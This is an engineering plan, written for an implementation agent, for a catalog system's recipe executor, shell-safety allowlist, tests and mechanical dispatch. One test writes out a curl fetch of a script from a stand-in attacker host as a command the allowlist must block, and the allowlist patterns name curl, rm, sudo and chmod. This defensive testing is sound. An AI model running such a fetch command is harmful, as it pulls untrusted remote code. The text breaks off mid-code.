# Implementation Plan — Yalayut Phase 3: Preempt + API/MCP

**For agentic workers.** This plan is written to be executed task-by-task by an
implementation agent. Each task is self-contained: it lists exact files, gives
bite-sized steps (2–5 min each), and contains complete, runnable Python — no
placeholders, no "TODO", no "similar to Task N". Follow TDD strictly: write the
failing test, run it (confirm FAIL), write the minimal implementation, run it
(confirm PASS), commit. Run pytest with a timeout prefix every time.

## Goal

Phase 3 makes yalayut's `preempt` exposure class and its `api`/`mcp` artifact
types work end-to-end. After Phase 3:

- A `shell_recipe` artifact routed to the mechanical lane by intersect actually
  executes its `invocation.steps` (real Windows-safe shell exec) via
  `yalayut.run_recipe()` invoked through a registered mr_roboto executor.
- `cookiecutter_template` and `public_apis_md` discovery adapters mechanically
  synthesize manifests from `cookiecutter.json` and markdown tables.
- `api` and `mcp` artifact plugins produce working `tool` registration payloads;
  an agent calling `api_coingecko__price` or an MCP tool hits a real execution
  path.
- MCP servers start on demand (never at boot), are health-probed, namespace
  their tools, respect a per-server/per-step tool budget, and idle-shut-down.
- Auth env-vars have a managed lifecycle: `env_status` column, fernet-encrypted
  `yalayut_secrets`, and at-match-time filtering of artifacts missing env.

**Assume Phases 1 and 2 are complete and working.** Phase 1 created
`packages/yalayut/` with `query()`, the 13 tables (including
`yalayut_mcp_processes`, `yalayut_mcp_tools`, `yalayut_secrets`), the auto-check
vetting pipeline, the `github_path` adapter, and seed manifests. Phase 2 created
`packages/intersect/` with `flash(task)` doing matching + exposure decision,
wired into the orchestrator pump and coulson; `intersect/budget.py` already caps
api count per step. Phase 3 does not modify Phase 1/2 public APIs — it fills the
`executor.py`, `plugins/api.py`, `plugins/mcp.py`, and two adapter files that
Phase 1 left as stubs, and registers the `yalayut_recipe` mr_roboto executor.

## Architecture

```
intersect.flash(task)                       [Phase 2 — unchanged]
  └─ preempt decision → routes task to mechanical lane,
       task["agent_type"]="mechanical",
       task["context"]["payload"] = {"action":"yalayut_recipe",
                                      "recipe_id": <id>, "args": {...}}

beckman mechanical lane → mr_roboto.run(task)          [Phase 3 wires]
  └─ action == "yalayut_recipe"
       └─ mr_roboto/executors/yalayut_recipe.py
            └─ yalayut.run_recipe(recipe_id, args)     [Phase 3 NEW]
                 └─ yalayut/executor.py
                      ├─ load manifest row from yalayut_index
                      ├─ static-bind already done by intersect; args passed in
                      ├─ for each invocation.steps[].cmd:
                      │     windows_safe_split → asyncio subprocess exec
                      └─ return {"ok", "steps":[...], "artifacts_present":[...]}

coulson tool registry                                  [Phase 2 — reads envelope]
  └─ task["skills"] entries with exposure_class=="tool"
       payload carries either:
         api  → {"kind":"api", "verb":..., "base_url":..., "env_var":...}
         mcp  → {"kind":"mcp", "artifact_id":..., "tool_name":..., "namespaced":...}
  └─ on agent tool-call of "<artifact_slug>__<tool>":
       prefix routes to yalayut.plugins.api.execute_api_tool / mcp.execute_mcp_tool

yalayut/plugins/api.py    → call src/tools/free_apis.call_api
yalayut/plugins/mcp.py    → MCP process manager (start/probe/idle-kill) + JSON-RPC

discovery adapters (Phase 3 NEW, mechanical, no LLM):
  yalayut/discovery/sources/cookiecutter_template.py  cookiecutter.json → manifest
  yalayut/discovery/sources/public_apis_md.py         markdown table → manifest[]
```

## Tech Stack

- Python 3.10, async throughout (`async/await`, `asyncio.create_subprocess_exec`).
- Windows 11 host. Shell recipes Windows-safe: no `chmod`/`sudo`/`apt`/`brew`,
  no bare `.sh`. `uvx`/`npx`/`npm`/`pip`/`git`/`cookiecutter` are allowlisted.
  argv passed as a list to `create_subprocess_exec` (no `shell=True`).
- SQLite via `aiosqlite` (WAL). DB accessor: `src/infra/db.py::get_db()`.
- HTTP: `aiohttp` (already used by `src/tools/free_apis.py::call_api`).
- MCP transport: `stdio` JSON-RPC 2.0 over a long-lived subprocess (v1 supports
  `stdio` only; `sse`/`streamable_http` deferred to Phase 4 — see Task 14).
- Encryption: `cryptography.fernet.Fernet`, key in `.env` `YALAYUT_SECRET_KEY`.
- Embeddings: `multilingual-e5-base` (768d) via `src/memory/embeddings.py`
  (reused for MCP tool-description ranking).
- Package layout: `packages/<name>/src/<name>/` (src layout).
- pytest with timeout: `timeout 60 pytest <target> -p no:cacheprovider`.

## File Structure

| File | Create/Modify | Responsibility |
|---|---|---|
| `packages/yalayut/src/yalayut/executor.py` | Create | `run_recipe(recipe_id, args) -> dict` — load manifest, exec shell steps, verify artifacts |
| `packages/yalayut/src/yalayut/shell_safety.py` | Create | Windows-safe argv tokenizer + shell-bin allowlist check used by executor |
| `packages/yalayut/src/yalayut/__init__.py` | Modify | Export `run_recipe` (operational API) |
| `packages/mr_roboto/src/mr_roboto/executors/yalayut_recipe.py` | Create | Mechanical executor body — calls `yalayut.run_recipe` |
| `packages/mr_roboto/src/mr_roboto/__init__.py` | Modify | Register `action == "yalayut_recipe"` dispatch branch |
| `packages/yalayut/src/yalayut/discovery/sources/cookiecutter_template.py` | Create | Adapter: fetch `cookiecutter.json` → synthesize `shell_recipe` manifest |
| `packages/yalayut/src/yalayut/discovery/sources/public_apis_md.py` | Create | Adapter: parse markdown API table → list of `api` manifests |
| `packages/yalayut/src/yalayut/plugins/api.py` | Create | `api` AccessPlugin: `to_application`, tool payload, `execute_api_tool` |
| `packages/yalayut/src/yalayut/plugins/mcp.py` | Create | `mcp` AccessPlugin + process lifecycle + tool budget + `execute_mcp_tool` |
| `packages/yalayut/src/yalayut/mcp_manager.py` | Create | MCP stdio process manager: start, health-probe, re-probe, idle-shutdown |
| `packages/yalayut/src/yalayut/secrets.py` | Create | fernet-encrypted secret read/write against `yalayut_secrets`; env_status calc |
| `packages/yalayut/src/yalayut/admin.py` | Modify | Add `missing_auth`, `set_secret`, `mcp_status`, `mcp_restart`, `mcp_kill` |
| `packages/yalayut/tests/test_executor.py` | Create | `run_recipe` unit + real cookiecutter integration test |
| `packages/yalayut/tests/test_shell_safety.py` | Create | argv tokenizer + allowlist tests |
| `packages/mr_roboto/tests/test_yalayut_recipe_executor.py` | Create | executor registration + dispatch reachability test |
| `packages/yalayut/tests/test_adapter_cookiecutter.py` | Create | cookiecutter.json → manifest fixture tests |
| `packages/yalayut/tests/test_adapter_public_apis.py` | Create | markdown table → manifest[] fixture tests |
| `packages/yalayut/tests/test_plugin_api.py` | Create | api plugin tool payload + execute tests |
| `packages/yalayut/tests/test_plugin_mcp.py` | Create | mcp plugin tool payload + budget + namespacing tests |
| `packages/yalayut/tests/test_mcp_manager.py` | Create | MCP start/probe/idle-shutdown tests (fake stdio server) |
| `packages/yalayut/tests/test_secrets.py` | Create | fernet round-trip + env_status tests |
| `packages/yalayut/tests/fixtures/cookiecutter.json` | Create | sample cookiecutter.json fixture |
| `packages/yalayut/tests/fixtures/public_apis_sample.md` | Create | sample public-apis markdown table fixture |
| `packages/yalayut/tests/fixtures/fake_mcp_server.py` | Create | minimal stdio JSON-RPC MCP server for integration tests |
| `.env.example` | Modify | Add `YALAYUT_SECRET_KEY` documentation line |

---

## Task 1 — Windows-safe shell tokenizer + allowlist

The executor must split `invocation.steps[].cmd` strings into argv lists without
`shell=True`, and must refuse anything outside the shell allowlist or matching a
Windows-incompat pattern from the recon section.

**Files:**
- Create: `packages/yalayut/src/yalayut/shell_safety.py`
- Test: `packages/yalayut/tests/test_shell_safety.py`

**Steps:**

- [ ] Create `packages/yalayut/tests/test_shell_safety.py` with the failing test:

```python
"""Tests for yalayut shell-safety tokenizer + allowlist."""
import pytest

from yalayut.shell_safety import (
    tokenize_cmd,
    check_shell_bin,
    windows_incompat_reason,
    ShellSafetyError,
)


def test_tokenize_simple():
    assert tokenize_cmd("uvx cookiecutter gh:cookiecutter/cookiecutter-django") == [
        "uvx", "cookiecutter", "gh:cookiecutter/cookiecutter-django",
    ]


def test_tokenize_quoted_arg():
    assert tokenize_cmd('cookiecutter --no-input project_name="My App"') == [
        "cookiecutter", "--no-input", "project_name=My App",
    ]


def test_tokenize_empty_raises():
    with pytest.raises(ShellSafetyError):
        tokenize_cmd("   ")


def test_allowlisted_bins_pass():
    for binary in ("uvx", "npx", "npm", "pip", "git", "cookiecutter", "python"):
        assert check_shell_bin(binary) is True


def test_unknown_bin_rejected():
    assert check_shell_bin("curl") is False
    assert check_shell_bin("rm") is False


def test_windows_incompat_chmod():
    assert windows_incompat_reason("chmod +x install.sh") == "chmod"


def test_windows_incompat_sudo():
    assert windows_incompat_reason("sudo apt-get install foo") in ("sudo", "apt")


def test_windows_incompat_bare_sh():
    assert windows_incompat_reason("./install.sh") == "bare_sh"


def test_windows_compat_clean_cmd():
    assert windows_incompat_reason("uvx cookiecutter gh:foo/bar") is None
```

- [ ] Run it — expect FAIL (module does not exist):
  `timeout 60 pytest packages/yalayut/tests/test_shell_safety.py -p no:cacheprovider`
  Expected: `ModuleNotFoundError: No module named 'yalayut.shell_safety'`.

- [ ] Create `packages/yalayut/src/yalayut/shell_safety.py`:

```python
"""Windows-safe shell tokenizer + bin allowlist for yalayut recipe execution.

Recipe ``invocation.steps[].cmd`` strings are split into argv lists here. No
``shell=True`` is ever used, so there is no shell-injection surface. The first
token of every command is checked against a static allowlist and the whole
string is screened for Windows-incompatible patterns documented in the yalayut
recon (chmod / sudo / apt / brew / bare .sh / symlink / $HOME / /dev/null).
"""
from __future__ import annotations

import re
import shlex

# First-token allowlist. Recipe scaffolders only — no network fetch tools,
# no destructive tools. Mirrors the yalayut_policy shell_allowlist seed.
SHELL_BIN_ALLOWLIST = frozenset(
    {
        "uvx",
        "npx",
        "npm",
        "pip",
        "pip3",
        "git",
        "cookiecutter",
        "python",
        "python3",
        "poetry",
        "pnpm",
        "yarn",
    }
)

# Windows-incompat patterns. Maps a compiled regex to the reason string.
_WIN_INCOMPAT: list[tuple[re.Pattern, str]] = [
    (re.compile(r"\bchmod\b"), "chmod"),
    (re.compile(r"\bsudo\b"), "sudo"),
    (re.compile(r"\bapt(-get)?\b"), "apt"),
    (re.compile(r"\bbrew\b"), "brew"),
    (re.compile(r"\byum\b"), "yum"),
    (re.compile(r"\bln\s+-s\b"), "symlink"),
    (re.compile(r"/dev/null"), "dev_null"),
    (re.compile(r"\$HOME\b"), "home_var"),
    # A bare .sh invocation (./foo.sh or `bash foo.sh` with no .ps1 sibling).
    (re.compile(r"(^|\s)(\./|bash\s+)\S*\.sh(\s|$)"), "bare_sh"),
]


class ShellSafetyError(ValueError):
    """Raised when a recipe command cannot be safely tokenized."""


def tokenize_cmd(cmd: str) -> list[str]:
    """Split a recipe command string into an argv list (no shell).

    Uses ``shlex`` in POSIX mode — quoting works identically on Windows since
    we never hand the string to ``cmd.exe``. Raises ``ShellSafetyError`` on an
    empty/whitespace-only command.
    """
    if not isinstance(cmd, str) or not cmd.strip():
        raise ShellSafetyError("empty command")
    try:
        argv = shlex.split(cmd, posix=True)
    except ValueError as e:
        raise ShellSafetyError(f"unparseable command: {e}") from e
    if not argv:
        raise ShellSafetyError("empty command after tokenize")
    return argv


def check_shell_bin(binary: str) -> bool:
    """Return True iff ``binary`` (the first argv token) is allowlisted."""
    # Strip any path component and a trailing .exe so `python.exe` matches.
    base = binary.replace("\\", "/").rsplit("/", 1)[-1]
    if base.lower().endswith(".exe"):
        base = base[:-4]
    return base.lower() in SHELL_BIN_ALLOWLIST


def windows_incompat_reason(cmd: str) -> str | None:
    """Return a reason string if ``cmd`` contains a Windows-incompat pattern.

    Returns ``None`` when the command is Windows-safe.
    """
    if not isinstance(cmd, str):
        return "not_a_string"
    for pattern, reason in _WIN_INCOMPAT:
        if pattern.search(cmd):
            return reason
    return None
```

- [ ] Run it — expect PASS:
  `timeout 60 pytest packages/yalayut/tests/test_shell_safety.py -p no:cacheprovider`
  Expected: 9 passed.

- [ ] Commit: `feat(yalayut): windows-safe shell tokenizer + bin allowlist for recipe exec`

---

## Task 2 — `run_recipe` executor core

`run_recipe(recipe_id, args)` loads the manifest row, runs each `invocation.steps`
command as a subprocess in the mission workspace, and reports per-step results
plus which declared `artifacts` are present.

**Files:**
- Create: `packages/yalayut/src/yalayut/executor.py`
- Modify: `packages/yalayut/src/yalayut/__init__.py`
- Test: `packages/yalayut/tests/test_executor.py`

**Steps:**

- [ ] Create `packages/yalayut/tests/test_executor.py` with the failing unit
  tests (the real-cookiecutter integration test is added in Task 3):

```python
"""Unit tests for yalayut.executor.run_recipe."""
import json
import sys

import pytest

from yalayut.executor import run_recipe


@pytest.mark.asyncio
async def test_run_recipe_unknown_id_returns_error():
    res = await run_recipe(999_999, {})
    assert res["ok"] is False
    assert "not found" in res["reason"]


@pytest.mark.asyncio
async def test_run_recipe_executes_steps(monkeypatch, tmp_path):
    # A manifest whose single step writes a marker file via python -c.
    marker = tmp_path / "made.txt"
    manifest = {
        "name": "test-echo",
        "artifact_type": "skill",
        "kind": "shell_recipe",
        "mechanizable": True,
        "invocation": {
            "steps": [
                {"cmd": f'python -c "open(r\'{marker}\',\'w\').write(\'ok\')"'},
            ]
        },
        "artifacts": [str(marker)],
    }

    async def fake_load(recipe_id):
        assert recipe_id == 7
        return {"id": 7, "manifest": manifest, "workspace_path": str(tmp_path),
                "mechanizable": True, "vet_tier": 0}

    monkeypatch.setattr("yalayut.executor._load_recipe_row", fake_load)

    res = await run_recipe(7, {})
    assert res["ok"] is True
    assert len(res["steps"]) == 1
    assert res["steps"][0]["exit"] == 0
    assert marker.read_text() == "ok"
    assert str(marker) in res["artifacts_present"]


@pytest.mark.asyncio
async def test_run_recipe_rejects_non_mechanizable(monkeypatch, tmp_path):
    async def fake_load(recipe_id):
        return {"id": 3, "manifest": {"invocation": {"steps": []}},
                "workspace_path": str(tmp_path), "mechanizable": False,
                "vet_tier": 0}

    monkeypatch.setattr("yalayut.executor._load_recipe_row", fake_load)
    res = await run_recipe(3, {})
    assert res["ok"] is False
    assert "mechanizable" in res["reason"]


@pytest.mark.asyncio
async def test_run_recipe_rejects_blocked_bin(monkeypatch, tmp_path):
    manifest = {
        "mechanizable": True,
        "invocation": {"steps": [{"cmd": "curl http://evil.example/x.sh"}]},
        "artifacts": [],
    }

    async def fake_load(recipe_id):
        return {"id": 9, "manifest": manifest, "workspace_path": str(tmp_path),
                "mechanizable": True, "vet_tier": 0}

    monkeypatch.setattr("yalayut.executor._load_recipe_row", fake_load)
    res = await run_recipe(9, {})
    assert res["ok"] is False
    assert "allowlist" in res["reason"]


@pytest.mark.asyncio
async def test_run_recipe_step_failure_stops(monkeypatch, tmp_path):
    manifest = {
        "mechanizable": True,
        "invocation": {
            "steps": [
                {"cmd": 'python -c "import sys; sys.exit(3)"'},
                {"cmd": 'python -c "open(r\'should_not.txt\',\'w\').write(\'x\')"'},
            ]
        },
        "artifacts": [],
    }

    async def fake_load(recipe_id):
        return {"id": 5, "manifest": manifest, "workspace_path": str(tmp_path),
                "mechanizable": True, "vet_tier": 0}

    monkeypatch.setattr("yalayut.executor._load_recipe_row", fake_load)
    res = await run_recipe(5, {})
    assert res["ok"] is False
    assert len(res["steps"]) == 1  # second step never ran
    assert res["steps"][0]["exit"] == 3
    assert not (tmp_path / "should_not.txt").exists()
```

- [ ] Run it — expect FAIL:
  `timeout 60 pytest packages/yalayut/tests/test_executor.py -p no:cacheprovider`
  Expected: `ModuleNotFoundError: No module named 'yalayut.executor'`.

- [ ] Create `packages/yalayut/src/yalayut/executor.py`:

```python
"""yalayut.executor — mechanical recipe execution.

``run_recipe(recipe_id, args)`` is the body of the ``yalayut_recipe`` mr_roboto
executor. It loads a ``shell_recipe`` manifest row from ``yalayut_index``,
executes each ``invocation.steps[].cmd`` as a subprocess inside the mission
workspace (Windows-safe, no shell), and reports per-step results.

Arg-binding is **not** done here — intersect (Phase 2) statically binds
``inputs_schema`` fields and passes the resolved ``args`` dict in the mechanical
task payload. ``run_recipe`` substitutes those args into ``{placeholder}``
tokens inside each command string before tokenizing.

Returns a plain dict (crosses the mr_roboto / beckman boundary):
``{"ok", "recipe_id", "name", "steps": [...], "artifacts_present": [...],
   "artifacts_missing": [...], "reason": str | None}``.
"""
from __future__ import annotations

import asyncio
import json
import os
from typing import Any

from src.infra.logging_config import get_logger
from yalayut.shell_safety import (
    ShellSafetyError,
    check_shell_bin,
    tokenize_cmd,
    windows_incompat_reason,
)

logger = get_logger("yalayut.executor")

_STEP_TIMEOUT_S = 600.0          # cookiecutter scaffolds can be slow on cold uvx
_OUTPUT_TAIL = 8 * 1024


async def _load_recipe_row(recipe_id: int) -> dict[str, Any] | None:
    """Load a recipe row from yalayut_index, parsed manifest attached.

    Returns ``None`` if the row is absent, disabled, or not a shell_recipe.
    The mission workspace path is resolved from the manifest's bound args at
    call time (intersect injects ``workspace_path`` into args); we fall back to
    the current working directory only in tests.
    """
    import yaml

    from src.infra.db import get_db

    db = await get_db()
    cur = await db.execute(
        "SELECT id, name, kind, manifest_path, mechanizable, vet_tier, enabled "
        "FROM yalayut_index WHERE id = ?",
        (recipe_id,),
    )
    row = await cur.fetchone()
    if row is None:
        return None
    (rid, name, kind, manifest_path, mechanizable, vet_tier, enabled) = row
    if not enabled or kind != "shell_recipe" or not manifest_path:
        return None
    try:
        with open(manifest_path, "r", encoding="utf-8") as fh:
            manifest = yaml.safe_load(fh) or {}
    except OSError as e:
        logger.warning("recipe manifest unreadable", recipe_id=recipe_id, err=str(e))
        return None
    return {
        "id": rid,
        "name": name,
        "manifest": manifest,
        "mechanizable": bool(mechanizable),
        "vet_tier": vet_tier,
        "workspace_path": None,
    }


def _substitute_args(cmd: str, args: dict[str, Any]) -> str:
    """Replace ``{key}`` tokens in a command string with bound arg values.

    Only string/number/bool args are substituted; missing keys are left as-is
    so the allowlist/incompat checks still see the literal token.
    """
    out = cmd
    for key, val in (args or {}).items():
        if isinstance(val, (str, int, float, bool)):
            out = out.replace("{" + str(key) + "}", str(val))
    return out


def _tail(data: bytes) -> str:
    if len(data) > _OUTPUT_TAIL:
        data = data[-_OUTPUT_TAIL:]
    return data.decode("utf-8", errors="replace")


async def _run_step(argv: list[str], cwd: str) -> dict[str, Any]:
    """Execute a single tokenized command. No shell."""
    loop = asyncio.get_event_loop()
    started = loop.time()
    try:
        proc = await asyncio.create_subprocess_exec(
            *argv,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=cwd,
        )
    except FileNotFoundError as e:
        return {"exit": -1, "ok": False, "stdout": "", "stderr": "",
                "error": f"executable not found: {e}", "argv": argv}
    except OSError as e:
        return {"exit": -1, "ok": False, "stdout": "", "stderr": "",
                "error": f"spawn failed: {e}", "argv": argv}
    timed_out = False
    try:
        out_b, err_b = await asyncio.wait_for(
            proc.communicate(), timeout=_STEP_TIMEOUT_S
        )
    except asyncio.TimeoutError:
        timed_out = True
        try:
            proc.kill()
        except ProcessLookupError:
            pass
        try:
            out_b, err_b = await asyncio.wait_for(proc.communicate(), timeout=5.0)
        except asyncio.TimeoutError:
            out_b, err_b = b"", b""
    exit_code = -1 if timed_out else (proc.returncode or 0)
    return {
        "exit": exit_code,
        "ok": (not timed_out) and exit_code == 0,
        "stdout": _tail(out_b),
        "stderr": _tail(err_b),
        "duration_s": round(loop.time() - started, 3),
        "timed_out": timed_out,
        "argv": argv,
    }


async def run_recipe(recipe_id: int, args: dict[str, Any]) -> dict[str, Any]:
    """Execute a shell_recipe artifact's invocation steps.

    Parameters
    ----------
    recipe_id : int
        ``yalayut_index.id`` of a ``kind='shell_recipe'`` artifact.
    args : dict
        Statically-bound inputs from intersect. May carry ``workspace_path``
        (the mission workspace dir the recipe should scaffold into).
    """
    row = await _load_recipe_row(recipe_id)
    if row is None:
        return {"ok": False, "recipe_id": recipe_id, "name": None,
                "steps": [], "artifacts_present": [], "artifacts_missing": [],
                "reason": f"recipe {recipe_id} not found / not a shell_recipe"}

    if not row.get("mechanizable"):
        return {"ok": False, "recipe_id": recipe_id, "name": row.get("name"),
                "steps": [], "artifacts_present": [], "artifacts_missing": [],
                "reason": "recipe is not mechanizable"}

    manifest = row.get("manifest") or {}
    steps = ((manifest.get("invocation") or {}).get("steps")) or []
    if not steps:
        return {"ok": False, "recipe_id": recipe_id, "name": row.get("name"),
                "steps": [], "artifacts_present": [], "artifacts_missing": [],
                "reason": "recipe has no invocation.steps"}

    cwd = (args or {}).get("workspace_path") or row.get("workspace_path") or os.getcwd()
    os.makedirs(cwd, exist_ok=True)

    # Pre-flight: tokenize + allowlist + incompat-check every step before
    # running anything, so a bad recipe fails fast with nothing executed.
    prepared: list[list[str]] = []
    for idx, step in enumerate(steps):
        raw = step.get("cmd") if isinstance(step, dict) else None
        if not raw:
            return {"ok": False, "recipe_id": recipe_id, "name": row.get("name"),
                    "steps": [], "artifacts_present": [], "artifacts_missing": [],
                    "reason": f"step {idx} has no cmd"}
        cmd = _substitute_args(raw, args)
        incompat = windows_incompat_reason(cmd)
        if incompat:
            return {"ok": False, "recipe_id": recipe_id, "name": row.get("name"),
                    "steps": [], "artifacts_present": [], "artifacts_missing": [],
                    "reason": f"step {idx} windows-incompat: {incompat}"}
        try:
            argv = tokenize_cmd(cmd)
        except ShellSafetyError as e:
            return {"ok": False, "recipe_id": recipe_id, "name": row.get("name"),
                    "steps": [], "artifacts_present": [], "artifacts_missing": [],
                    "reason": f"step {idx} untokenizable: {e}"}
        if not check_shell_bin(argv[0]):
            return {"ok": False, "recipe_id": recipe_id, "name": row.get("name"),
                    "steps": [], "artifacts_present": [], "artifacts_missing": [],
                    "reason": f"step {idx} bin not in allowlist: {argv[0]!r}"}
        prepared.append(argv)

    # Execute sequentially; stop on the first failing step.
    step_results: list[dict[str, Any]] = []
    all_ok = True
    for argv in prepared:
        result = await _run_step(argv, cwd)
        step_results.append(result)
        logger.info("recipe step done", recipe_id=recipe_id,
                     bin=argv[0], exit=result["exit"], ok=result["ok"])
        if not result["ok"]:
            all_ok = False
            break

    # Verify declared artifacts (paths relative to cwd unless absolute).
    declared = manifest.get("artifacts") or []
    present, missing = [], []
    for art in declared:
        path = art if os.path.isabs(art) else os.path.join(cwd, art)
        (present if os.path.exists(path) else missing).append(art)

    ok = all_ok and not missing
    reason = None
    if not all_ok:
        reason = f"step {len(step_results) - 1} failed (exit {step_results[-1]['exit']})"
    elif missing:
        reason = f"missing declared artifacts: {missing}"

    return {
        "ok": ok,
        "recipe_id": recipe_id,
        "name": row.get("name"),
        "steps": step_results,
        "artifacts_present": present,
        "artifacts_missing": missing,
        "reason": reason,
    }
```

- [ ] Run it — expect PASS:
  `timeout 60 pytest packages/yalayut/tests/test_executor.py -p no:cacheprovider`
  Expected: 5 passed.

- [ ] Modify `packages/yalayut/src/yalayut/__init__.py` — add the export. Append
  to the existing imports block:

```python
from yalayut.executor import run_recipe  # noqa: F401  (operational API)
```

  and add `"run_recipe"` to the module's `__all__` list if one exists.

- [ ] Run the package import smoke test:
  `python -c "import yalayut; assert hasattr(yalayut, 'run_recipe')"`
  Expected: no output, exit 0.

- [ ] Commit: `feat(yalayut): run_recipe executor — sequential windows-safe shell step exec`

---

## Task 3 — Real cookiecutter integration test for `run_recipe`

The project owner requires `run_recipe` proven against a real cookiecutter
invocation. This test is network-gated (`uvx` fetches the template) and skipped
when `uvx` is absent so CI without network still passes.

**Files:**
- Modify: `packages/yalayut/tests/test_executor.py`

**Steps:**

- [ ] Append the integration test to `packages/yalayut/tests/test_executor.py`:

```python
import shutil


def _uvx_available() -> bool:
    return shutil.which("uvx") is not None


@pytest.mark.integration
@pytest.mark.skipif(not _uvx_available(), reason="uvx not installed")
@pytest.mark.asyncio
async def test_run_recipe_real_cookiecutter(monkeypatch, tmp_path):
    """End-to-end: run_recipe scaffolds a real cookiecutter package.

    Uses cookiecutter-pypackage (clean, Windows-friendly, the recon's prime
    T0 seed). ``--no-input`` + ``--default-config`` avoids interactive prompts.
    """
    out_dir = tmp_path / "scaffold"
    out_dir.mkdir()
    manifest = {
        "name": "cc-pypackage",
        "artifact_type": "skill",
        "kind": "shell_recipe",
        "mechanizable": True,
        "invocation": {
            "steps": [
                {
                    "cmd": (
                        "uvx cookiecutter --no-input "
                        "gh:audreyfeldroy/cookiecutter-pypackage "
                        "project_name=YalayutProbe"
                    )
                }
            ]
        },
        # cookiecutter-pypackage default slug from project_name=YalayutProbe.
        "artifacts": ["yalayutprobe/pyproject.toml"],
    }

    async def fake_load(recipe_id):
        return {"id": recipe_id, "name": "cc-pypackage", "manifest": manifest,
                "mechanizable": True, "vet_tier": 0,
                "workspace_path": str(out_dir)}

    monkeypatch.setattr("yalayut.executor._load_recipe_row", fake_load)

    res = await run_recipe(101, {"workspace_path": str(out_dir)})
    assert res["ok"] is True, res["reason"]
    assert res["steps"][0]["exit"] == 0
    assert res["artifacts_present"], res
    # The generated project dir really exists on disk.
    assert (out_dir / "yalayutprobe").is_dir()
```

- [ ] Run the integration test explicitly (longer timeout — cold `uvx` download):
  `timeout 300 pytest packages/yalayut/tests/test_executor.py -k real_cookiecutter -p no:cacheprovider -m integration`
  Expected: 1 passed (or 1 skipped if `uvx` is absent on the host).

- [ ] Commit: `test(yalayut): real cookiecutter integration test for run_recipe`

---

## Task 4 — `yalayut_recipe` mr_roboto executor

The mechanical executor body. intersect (Phase 2) routes preempt tasks to the
mechanical lane with `context.payload.action == "yalayut_recipe"`; this file +
the `__init__.py` branch make that lane actually run.

**Files:**
- Create: `packages/mr_roboto/src/mr_roboto/executors/yalayut_recipe.py`
- Modify: `packages/mr_roboto/src/mr_roboto/__init__.py`
- Test: `packages/mr_roboto/tests/test_yalayut_recipe_executor.py`

**Steps:**

- [ ] Create `packages/mr_roboto/tests/test_yalayut_recipe_executor.py`:

```python
"""yalayut_recipe mechanical executor — body + dispatch reachability."""
import pytest

import mr_roboto
from mr_roboto.executors.yalayut_recipe import run as yalayut_recipe_run


@pytest.mark.asyncio
async def test_executor_body_calls_run_recipe(monkeypatch):
    captured = {}

    async def fake_run_recipe(recipe_id, args):
        captured["recipe_id"] = recipe_id
        captured["args"] = args
        return {"ok": True, "recipe_id": recipe_id, "steps": [{"exit": 0}],
                "artifacts_present": ["x"], "artifacts_missing": [], "reason": None}

    monkeypatch.setattr("yalayut.run_recipe", fake_run_recipe)
    task = {"context": {"payload": {"action": "yalayut_recipe",
                                    "recipe_id": 12, "args": {"db": "postgres"}}}}
    res = await yalayut_recipe_run(task)
    assert res["ok"] is True
    assert captured["recipe_id"] == 12
    assert captured["args"]["db"] == "postgres"


@pytest.mark.asyncio
async def test_executor_body_missing_recipe_id():
    task = {"context": {"payload": {"action": "yalayut_recipe", "args": {}}}}
    res = await yalayut_recipe_run(task)
    assert res["ok"] is False
    assert "recipe_id" in res["reason"]


@pytest.mark.asyncio
async def test_dispatch_reaches_executor(monkeypatch):
    """mr_roboto.run() routes action=yalayut_recipe to the executor."""
    async def fake_run_recipe(recipe_id, args):
        return {"ok": True, "recipe_id": recipe_id, "steps": [],
                "artifacts_present": [], "artifacts_missing": [], "reason": None}

    monkeypatch.setattr("yalayut.run_recipe", fake_run_recipe)
    task = {
        "agent_type": "mechanical",
        "context": {"payload": {"action": "yalayut_recipe",
                                 "recipe_id": 4, "args": {}}},
    }
    action = await mr_roboto.run(task)
    assert action.status == "completed"
    assert action.result["ok"] is True
```

- [ ] Run it — expect FAIL:
  `timeout 60 pytest packages/mr_roboto/tests/test_yalayut_recipe_executor.py -p no:cacheprovider`
  Expected: `ModuleNotFoundError: No module named 'mr_roboto.executors.yalayut_recipe'`.

- [ ] Create `packages/mr_roboto/src/mr_roboto/executors/yalayut_recipe.py`:

```python
"""Mr. Roboto — yalayut_recipe mechanical executor.

intersect (Phase 2) routes a ``preempt`` task to the mechanical lane with
``context.payload`` shaped:

```
{"action": "yalayut_recipe", "recipe_id": <int>, "args": {...}}
```

This executor is a thin leaf shim: it unpacks the payload and calls
``yalayut.run_recipe``. It imports yalayut lazily so mr_roboto carries no
import-time coupling to the catalog.
"""
from __future__ import annotations

from typing import Any

from src.infra.logging_config import get_logger

logger = get_logger("mr_roboto.yalayut_recipe")


async def run(task: dict[str, Any]) -> dict[str, Any]:
    payload = (task.get("context") or {}).get("payload") or task.get("payload") or {}
    recipe_id = payload.get("recipe_id")
    args = payload.get("args") or {}

    if recipe_id is None:
        return {"ok": False, "reason": "yalayut_recipe: payload missing recipe_id"}
    try:
        recipe_id = int(recipe_id)
    except (TypeError, ValueError):
        return {"ok": False, "reason": f"yalayut_recipe: bad recipe_id {recipe_id!r}"}

    # Propagate the mission workspace so the recipe scaffolds in the right dir.
    if "workspace_path" not in args:
        from src.tools.workspace import get_mission_workspace
        mission_id = task.get("mission_id")
        if mission_id is not None:
            try:
                args = {**args, "workspace_path": get_mission_workspace(mission_id)}
            except Exception as e:
                logger.warning("workspace resolve failed", err=str(e))

    try:
        import yalayut
        result = await yalayut.run_recipe(recipe_id, args)
    except Exception as e:
        logger.warning("run_recipe raised", recipe_id=recipe_id, err=str(e))
        return {"ok": False, "reason": f"yalayut_recipe: run_recipe raised: {e}"}

    if not isinstance(result, dict):
        return {"ok": False, "reason": "yalayut_recipe: run_recipe returned non-dict"}
    return result
```

- [ ] Run the body tests (still FAIL on `test_dispatch_reaches_executor` until
  the `__init__.py` branch lands):
  `timeout 60 pytest packages/mr_roboto/tests/test_yalayut_recipe_executor.py -k body -p no:cacheprovider`
  Expected: 2 passed.

- [ ] Modify `packages/mr_roboto/src/mr_roboto/__init__.py` — add a dispatch
  branch. Insert it next to the other `executors/` actions (after the
  `action == "cloud_refresh"` branch near line 1883; use the existing branch
  style — `Action(status=..., ...)`):

```python
    if action == "yalayut_recipe":
        # Phase 3 — preempt lane: run a yalayut shell_recipe mechanically.
        from mr_roboto.executors.yalayut_recipe import run as _yalayut_recipe
        try:
            res = await _yalayut_recipe(task)
            if not res.get("ok"):
                return Action(
                    status="failed",
